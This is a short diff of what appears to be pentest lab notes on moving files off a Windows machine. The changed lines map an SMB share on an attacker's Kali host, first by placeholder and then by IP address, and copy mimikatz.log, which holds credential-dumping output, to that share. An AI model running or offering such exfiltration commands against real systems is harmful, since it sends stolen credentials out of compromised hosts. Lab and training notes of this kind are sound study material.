@@ -118,7 +118,8 @@ Once done, please try to reconnect to your VPN and see how it goes.
 
 On Windows:
 
-`net use m: \\Kali_IP\test /user:kourosh kourosh copy mimikatz.log m:\`
+`net use m: \\192.168.45.241\test /user:kourosh kourosh` 
+`copy mimikatz.log m:\`
 
 2) RDP mounting shared folder:
 
